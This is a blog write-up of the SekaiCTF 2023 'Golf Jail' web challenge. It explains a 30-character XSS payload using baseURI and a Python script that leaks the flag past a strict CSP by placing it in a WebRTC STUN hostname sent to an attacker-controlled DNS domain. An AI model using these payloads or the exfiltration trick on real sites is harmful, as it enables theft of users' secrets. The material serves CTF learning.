<!DOCTYPE html>
<html lang="en"><!--
 __  __                __                                     __
/\ \/\ \              /\ \             __                    /\ \
\ \ \_\ \   __  __    \_\ \      __   /\_\      __       ___ \ \ \/'\
 \ \  _  \ /\ \/\ \   /'_` \   /'__`\ \/\ \   /'__`\    /'___\\ \ , <
  \ \ \ \ \\ \ \_\ \ /\ \L\ \ /\  __/  \ \ \ /\ \L\.\_ /\ \__/ \ \ \\`\
   \ \_\ \_\\/`____ \\ \___,_\\ \____\ _\ \ \\ \__/.\_\\ \____\ \ \_\ \_\
    \/_/\/_/ `/___/> \\/__,_ / \/____//\ \_\ \\/__/\/_/ \/____/  \/_/\/_/
                /\___/                \ \____/
                \/__/                  \/___/

Powered by Hydejack v9.2.1 <https://hydejack.com/>
--><head> <title>SekaiCTF-23 | maitai's blog</title> <meta name="description" content="Web - Golf Jail "> <link rel="canonical" href="http://localhost:4000/2023/08/29/sekai23-golf-jail.html"> <meta name="color-scheme" content="light"> <meta name="theme-color" content="rgb(8,46,57)"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"> <meta http-equiv="x-ua-compatible" content="ie=edge"> <meta name="mobile-web-app-capable" content="yes"> <meta name="apple-mobile-web-app-capable" content="yes"> <meta name="apple-mobile-web-app-title" content="maitai's blog"> <meta name="apple-mobile-web-app-status-bar-style" content="default"> <meta name="application-name" content="maitai's blog"> <meta name="generator" content="Hydejack v9.2.1" /> <link rel="alternate" href="http://localhost:4000/2023/08/29/sekai23-golf-jail.html" hreflang="en"> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="maitai&apos;s blog" /> <link rel="shortcut icon" href="/assets/icons/favicon.ico"> <link rel="apple-touch-icon" href="/assets/icons/icon-192x192.png"> <link rel="manifest" href="/assets/site.webmanifest"> <link rel="preload" href="/assets/img/swipe.svg" as="image" id="_hrefSwipeSVG"> <script>((r,a)=>{function d(e,t,n,o){e.addEventListener?e.addEventListener(t,n,o):e.attachEvent?e.attachEvent("on"+t,n):e["on"+t]=n}r.loadJS=function(e,t){var n=a.createElement("script"),e=(n.src=e,t&&d(n,"load",t,{once:!0}),a.scripts[0]);return e.parentNode.insertBefore(n,e),n},r._loaded=!1,r.loadJSDeferred=function(e,t){var n=a.createElement("script");function o(){r._loaded=!0,t&&d(n,"load",t,{once:!0});var e=a.scripts[0];e.parentNode.insertBefore(n,e)}return n.src=e,r._loaded?o():d(r,"load",o,{once:!0}),n},r.setRel=r.setRelStylesheet=function(e){d(a.getElementById(e),"load",function(){this.rel="stylesheet"},{once:!0})}})(window,document); !function(a){"use strict";var b=function(b,c,d){function e(a){return h.body?a():void setTimeout(function(){e(a)})}function f(){i.addEventListener&&i.removeEventListener("load",f),i.media=d||"all"}var g,h=a.document,i=h.createElement("link");if(c)g=c;else{var j=(h.body||h.getElementsByTagName("head")[0]).childNodes;g=j[j.length-1]}var k=h.styleSheets;i.rel="stylesheet",i.href=b,i.media="only x",e(function(){g.parentNode.insertBefore(i,c?g:g.nextSibling)});var l=function(a){for(var b=i.href,c=k.length;c--;)if(k[c].href===b)return a();setTimeout(function(){l(a)})};return i.addEventListener&&i.addEventListener("load",f),i.onloadcssdefined=l,l(f),i};"undefined"!=typeof exports?exports.loadCSS=b:a.loadCSS=b}("undefined"!=typeof global?global:this); !function(a){if(a.loadCSS){var b=loadCSS.relpreload={};if(b.support=function(){try{return a.document.createElement("link").relList.supports("preload")}catch(b){return!1}},b.poly=function(){for(var b=a.document.getElementsByTagName("link"),c=0;c<b.length;c++){var d=b[c];"preload"===d.rel&&"style"===d.getAttribute("as")&&(a.loadCSS(d.href,d,d.getAttribute("media")),d.rel=null)}},!b.support()){b.poly();var c=a.setInterval(b.poly,300);a.addEventListener&&a.addEventListener("load",function(){b.poly(),a.clearInterval(c)}),a.attachEvent&&a.attachEvent("onload",function(){a.clearInterval(c)})}}}(this); !function(w) { w._baseURL = '/'; w._publicPath = '/assets/js/'; w._noPushState = false; w._noDrawer = false; w._noNavbar = false; w._noToc = false; w._noSearch = false; w._search = { DATA_URL: '/assets/sitedata.json?no-cache', STORAGE_KEY: 'mini-search/', INDEX_KEY: 'index--2024-11-29T20:02:58+01:00', }; w._clapButton = true; }(window);</script> <script async src="/assets/bower_components/MathJax/es5/tex-mml-chtml.js" id="_MathJax"></script> <!--[if gt IE 8]><!----> <link rel="stylesheet" href="/assets/css/hydejack-9.2.1.css" id="_stylePreload"> <link rel="stylesheet" href="/assets/icomoon/style.css" id="_iconsPreload"> <style id="_pageStyle"> html { --accent-color: rgb(79,177,186); --accent-color-faded: rgba(79, 177, 186, 0.5); --accent-color-highlight: rgba(79, 177, 186, 0.1); --accent-color-darkened: #409ba3; --theme-color: rgb(8,46,57); --dark-mode-body-bg: #282f31; --dark-mode-border-color: #343c3f; } </style> <!--<![endif]--> </head> <body class=""> <hy-push-state id="_pushState" replace-selector="#_main" link-selector="a[href]:not([href^='/assets/']):not(.external):not(.no-push-state)" script-selector="script" duration="500" hashchange > <div id="_navbar" class="navbar fixed-top"> <div class="content"> <span class="sr-only">Jump to:</span> <div class="nav-btn-bar"> <a id="_menu" class="nav-btn no-hover" href="#_drawer--opened"> <span class="sr-only">Navigation</span> <span class="icon-menu"></span> </a> <div class="nav-span"></div> </div> </div> </div> <hr class="sr-only" hidden /> <main id="_main" class="content layout-post" role="main" > <nav id="breadcrumbs" class="screen-only"><ul> <li><a href="/">home</a></li> <li> <span>/</span> <a href="/2023/">2023</a> </li> <li> <span>/</span> <a href="/2023/08/">08</a> </li> <li> <span>/</span> <a href="/2023/08/29/">29</a> </li> <li> <span>/</span> <span>sekai23-golf-jail.html</span> </li> </ul></nav> <article id="post-2023-08-29-sekai23-golf-jail" class="page post mb6" role="article"> <header> <h1 class="post-title flip-project-title"> SekaiCTF-23 </h1> <div class="post-date"> <span class="ellipsis mr1"> <time datetime="2023-08-29T00:00:00+02:00">29 Aug 2023</time> </span> </div> <div class="hr pb0"></div> </header> <h1 id="web---golf-jail">Web - Golf Jail</h1> <p><code class="language-plaintext highlighter-rouge">I hope you like golfing ‚õ≥üèåÔ∏è‚õ≥üèåÔ∏è</code></p> <p>Stats : 16 solves / 475 pts</p> <p>Difficulty: ‚≠ê‚≠ê‚≠ê‚≠ê</p> <p>Author: strellic</p> <h2 id="introduction">Introduction</h2> <p>The challenge code is really small, it‚Äôs ~24 lines of code</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">"Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval';"</span><span class="p">);</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">"Cross-Origin-Opener-Policy: same-origin"</span><span class="p">);</span>

    <span class="nv">$payload</span> <span class="o">=</span> <span class="s2">"üö©üö©üö©"</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"xss"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"xss"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"xss"</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="mi">30</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$payload</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"xss"</span><span class="p">];</span>
    <span class="p">}</span>

    <span class="nv">$flag</span> <span class="o">=</span> <span class="s2">"SEKAI</span><span class="si">{</span><span class="nv">test_flag</span><span class="si">}</span><span class="s2">"</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"flag"</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"flag"</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$flag</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"flag"</span><span class="p">];</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;iframe</span>
            <span class="na">sandbox=</span><span class="s">"allow-scripts"</span>
            <span class="na">srcdoc=</span><span class="s">"&lt;!-- </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$flag</span><span class="p">)</span> <span class="cp">?&gt;</span><span class="s"> --&gt;&lt;div&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="s">&lt;/div&gt;"</span>
        <span class="nt">&gt;&lt;/iframe&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div> <p>The idea is straightforward here, we need to achieve XSS with just 30 chars and bypassing this really strict CSP</p> <h2 id="day-1---chasing-the-rabbit-down-the-hole">Day 1 - Chasing the rabbit down the hole</h2> <p>Although the idea of the challenge is really simple, it‚Äôs really hard to find a proper way to exploit it. The first thing that came to my mind was to look for some really <mark class="hltr-orange">tiny XSS payload</mark> , so i googled for <code class="language-plaintext highlighter-rouge">tiny xss</code> and looked if i can find something useful.</p> <p>With no surprise the shortest payload that i‚Äôve found was <code class="language-plaintext highlighter-rouge">&lt;svg/onload=eval(name)&gt;</code> which is 23 chars long. I thought that maybe i can find something even smaller but apparently this is the shortest at the moment.</p> <p>How this payload works by the way? It‚Äôs <mark class="hltr-orange">indeed simple</mark> because <code class="language-plaintext highlighter-rouge">name</code> is a shorthand for <code class="language-plaintext highlighter-rouge">window.name</code> which is a variable that contains the name of the window in the browsing context. The really cool thing is that we can set the <code class="language-plaintext highlighter-rouge">window.name</code> property using the second parameter of the <code class="language-plaintext highlighter-rouge">window.open</code> function. So if we can make the bot visit a site that we control we can open a new window with an arbitrary name and evaluate it to achieve xss</p> <p>But in our case this won‚Äôt work, because the bot will only visits url that matches this regex <code class="language-plaintext highlighter-rouge">/^https:\/\/golfjail\.chals\.sekai\.team\//</code></p> <p>Another payload that i thought about was to use <code class="language-plaintext highlighter-rouge">location.hash</code> but this will be way more chars than the one allowed Looking through https://tinyxss.terjanq.me/ i‚Äôve found about this payload <code class="language-plaintext highlighter-rouge">&lt;script/src=//«ä.‚Ç®&gt;&lt;/script&gt;</code> which is 27 chars long But even this one won‚Äôt work due to strict CSP which states <code class="language-plaintext highlighter-rouge">script-src 'unsafe-inline' 'unsafe-eval'</code> so no external scripts allowed</p> <p>At this point it started to become frustrating, but suddenly i remembered about a challenge written by <mark class="hltr-orange">@aszx87410</mark> about an XSS with a very strict chars limit</p> <p>So i googled <code class="language-plaintext highlighter-rouge">aszx87410 0222 intigriti</code> to try to find some new inspiration</p> <h3 id="its-all-about-url">It‚Äôs all about URL</h3> <p>The writeup for the <a href="https://github.com/aszx87410/ctf-writeups/issues/49">challenge</a> (and obviously the challenge) is <mark class="hltr-orange">really good</mark>. Here the author consider a payload that i haven‚Äôt thought about before</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;svg</span><span class="err">/</span><span class="na">onload=</span><span class="s">eval(`'`+URL)</span><span class="nt">&gt;</span> 
</code></pre></div></div> <p>In the writeup is explained perfectly how the payload is supposed to work, and how to craft an url that fits the <code class="language-plaintext highlighter-rouge">eval</code> and can be used to execute javascript code</p> <p>All we need to know for the challenge purposes was that if we supply an URL like this</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://golfjail.chals.sekai.team/?xss=&lt;svg/onload=eval(`'`+URL)&gt;#';console.log(1)
</code></pre></div></div> <p>The xss parameter will be less than 30 chars, and the URL will be valid syntax to be evaluated from <code class="language-plaintext highlighter-rouge">eval</code> to achieve XSS</p> <p>So were is the problem here? It‚Äôs simple, <mark class="hltr-orange">this won't work anymore</mark>. Beacause URL is a function and doesn‚Äôt give the URL of the page so this seems like a dead end</p> <p>Ok seriously now i was on the verge of a mental breakdown, so i decided that it was better to go to sleep and start the morning after</p> <h2 id="day-2---do-you-believe-in-magic">Day 2 - Do you believe in magic?</h2> <p>It was clear at this point that we need some sort of placeholder in order to bypass the chars limit, and the only thing we can control was the URL only. So i started digging into the js documentation, html specification and every kind of blog-post regarding javascript to find the tiniest spark of hope to get XSS</p> <p>After 2 or 3 hours of digging in depth of the web and after a bit of fuzzing i‚Äôve found this property <code class="language-plaintext highlighter-rouge">Node.baseURI</code> which returns the <mark class="hltr-orange">absolute base URL</mark> of the document containing the node This was interesting enough to spend some time on time, but i was completely shocked when from inside the iframe the <code class="language-plaintext highlighter-rouge">document.baseURI</code> property returned the location of the <mark class="hltr-orange">top window</mark></p> <p>This literally blew my mind, but now i knew which placeholder i can use to bypass the 30 chars length</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;svg</span><span class="err">/</span><span class="na">onload=</span><span class="s">eval(`'`+baseURI)</span><span class="nt">&gt;</span>
</code></pre></div></div> <p>The last thing to mention here is that we can omit <code class="language-plaintext highlighter-rouge">document</code> and just use <code class="language-plaintext highlighter-rouge">baseURI</code> because <code class="language-plaintext highlighter-rouge">document</code> is implicitly used, so the payload will be exactly 30 chars !</p> <h3 id="stealing-strellic-exploit">Stealing strellic exploit</h3> <p>Ok, so we have xss and now we need to exfiltrate the flag. Fortunately this part was easy for me because right from the start i knew a way to bypass that really strict CSP. The way is <mark class="hltr-orange">webRTC</mark> . Why do i knew it? From another strellic challenge of course. The challenge was released in the corCTF23 and the name is <a href="https://brycec.me/posts/corctf_2023_challenges#crabspace">crabspace</a>, which basically uses webRTC to exfiltrate data So i <s>stolen</s> borrowed the payload from his writeup and used it to perform exfiltration</p> <h2 id="leaking-all-the-things">Leaking all the things</h2> <p>I‚Äôve automated the exploit due to the fact that i‚Äôve had some hard time to exfiltrate data via webRTC because of some special chars in the flag. Basically what i did in the exploit was to take the flag from inside the iframe via <code class="language-plaintext highlighter-rouge">document.firstChild.textContent</code> and split it by the underscore to leak it <mark class="hltr-orange">word by word</mark></p> <p>The funny part here is that when i‚Äôve tried to leak the last word of the flag, something didn‚Äôt work apparently so my guess was that there will be some special chars at the end of the word that breaks the DNS query So i need to tweak my exploit a bit to leak the flag</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">base64</span>

<span class="n">URL</span> <span class="o">=</span> <span class="s">"https://golfjail.chals.sekai.team/?xss=&lt;svg/onload=eval(`'`%2bbaseURI)&gt;#';"</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">"""
var index = 0;
var pay=document.firstChild.textContent.trim().split('{')[1].split('}')[0].split("_")[index];
pc = new RTCPeerConnection({'iceServers':[{'urls':['stun:'+pay+'.my_mess_with_dns']}]});
pc.createOffer({offerToReceiveAudio:1}).then(o=&gt;pc.setLocalDescription(o));
"""</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="s">""</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"eval(atob('"</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="sa">b</span><span class="s">"'))"</span><span class="p">;</span>
<span class="k">print</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="n">payload</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">))</span>

<span class="c1">#SEKAI{jsjails_4re_b3tter_th4n_pyjai1s!}
</span></code></pre></div></div> <p>Notice that has i‚Äôve said before, you need to change the <code class="language-plaintext highlighter-rouge">index</code> value every time to leak every word, and for the last word i‚Äôve exfiltrated all of it besides the last char. To be more specific, the last char was exfiltrated by taking is charCode and leaking it, then i converted it back to its original value</p> <h2 id="conclusion">Conclusion</h2> <p>The challenge was really fun to play and i‚Äôve learn a lot of new things. As always strelli challs are a goldmine, definitely want to play the other challenge which is leakless-note in order to learn novel xs-leak technique</p> </article> <hr class="dingbat related mb6" /> <aside class="related mb4" role="complementary"> <h2 class="hr-bottom">Related Posts</h2> <ul class="related-posts"> <li class="h4"> <a href="/2024/11/29/flatt-xss-writeup.html" class="flip-title"><span>Flatt Security XSS Challenge - Writeup</span></a> <time class="faded fine" datetime="2024-11-29T00:00:00+01:00">29 Nov 2024</time></li> <li class="h4"> <a href="/2024/06/28/r3ctf-r3gallery-writeup.html" class="flip-title"><span>R3CTF - r3gallery Writeup</span></a> <time class="faded fine" datetime="2024-06-28T00:00:00+02:00">28 Jun 2024</time></li> <li class="h4"> <a href="/2024/05/20/lake-finals-23-phishing-writeup.html" class="flip-title"><span>LakeCTF Finals 2023 - Phishing Writeup</span></a> <time class="faded fine" datetime="2024-05-20T00:00:00+02:00">20 May 2024</time></li> </ul></aside> </main> <hy-drawer id="_drawer" class="" side="left" threshold="10" noscroll > <header id="_sidebar" class="sidebar" role="banner"> <div class="sidebar-bg sidebar-overlay" style="background-color:rgb(79,177,186);background-image:url(/assets/img/sidebar-bg.jpg)"></div> <div class="sidebar-sticky"> <div class="sidebar-about"> <a class="sidebar-title" href="/"><h2 class="h1">maitai's blog</h2></a> <p class=""> BSc Computer Science Engineering Studying </p> </div> <nav class="sidebar-nav heading" role="navigation"> <span class="sr-only">Navigation:</span> <ul> </ul> </nav> <div class="sidebar-social"> <span class="sr-only">Social</span> <ul> <li> <a href="https://twitter.com/MaitaiThe" title="Twitter" class="no-mark-external"> <span class="icon-twitter"></span> <span class="sr-only">Twitter</span> </a> </li> </ul> </div> </div> </header> </hy-drawer> <hr class="sr-only" hidden /> </hy-push-state> <!--[if gt IE 10]><!----> <script nomodule>(()=>{var t,n=document.createElement("script");!("noModule"in n)&&"onbeforeload"in n&&(t=!1,document.addEventListener("beforeload",function(e){if(e.target===n)t=!0;else if(!e.target.hasAttribute("nomodule")||!t)return;e.preventDefault()},!0),n.type="module",n.src=".",document.head.appendChild(n),n.remove())})(); </script> <script src="/assets/js/hydejack-9.2.1.js" type="module"></script> <script src="/assets/js/LEGACY-hydejack-9.2.1.js" nomodule defer></script> <!--<![endif]--> <div hidden> <h2 class="sr-only">Templates:</h2> <template id="_animation-template"> <div class="animation-main fixed-top"> <nav id="breadcrumbs" class="screen-only"><ul> </ul></nav> <div class="content"> <div class="page"></div> </div> </div> </template> <template id="_loading-template"> <div class="loading nav-btn fr"> <span class="sr-only">Loading‚Ä¶</span> <span class="icon-cog"></span> </div> </template> <template id="_error-template"> <div class="page"> <h1 class="page-title">Error</h1> <p class="lead"> Sorry, an error occurred while loading: <a class="this-link" href=""></a>. </p> </div> </template> <template id="_permalink-template"> <a href="#" class="permalink"> <span class="sr-only">Permalink</span> <span class="content-hash"></span> </a> </template> </div> </body></html>
